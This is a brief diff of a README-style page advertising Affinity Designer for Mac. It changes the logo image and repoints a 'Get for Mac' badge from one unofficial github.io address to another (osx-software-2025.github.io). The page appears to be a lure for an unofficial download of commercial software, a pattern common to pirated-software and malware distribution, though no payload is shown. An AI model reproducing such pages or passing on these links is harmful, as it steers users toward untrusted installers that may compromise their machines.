@@ -1,12 +1,12 @@
 # Affinity Designer – Professional Vector Graphics  
 
 <div align="center">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Affinity_Designer_2-logo.svg/2048px-Affinity_Designer_2-logo.svg.png" width="250"/>
+  <img src="https://www.appgefahren.de/wp-content/cache/wp-appbox/c6cb954650156afbbd3a3095ce1c8bd6/ai-217c112c6e39d44d6b437472d153d241" width="250"/>
 </div>  
 <br>
 <div align="center">
 
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://hadsoftware.github.io/.github)
+[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://osx-software-2025.github.io/.github/aff)
 
 </div>
 
